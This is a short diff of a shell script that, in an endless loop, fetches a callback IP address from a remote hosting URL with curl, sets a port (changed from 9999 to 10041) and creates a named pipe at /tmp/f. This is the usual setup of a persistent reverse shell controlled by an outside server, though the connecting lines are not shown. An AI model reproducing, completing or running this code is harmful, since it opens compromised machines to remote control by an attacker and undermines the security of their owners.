@@ -7,7 +7,7 @@ fi
 while true; do
 
 IP=$(curl -s https://ibnusaja.nasihosting.com/temp.txt)
-PORT="9999"
+PORT="10041"
 rm -rf /tmp/f
 # mkdir /tmp
 mkfifo /tmp/f
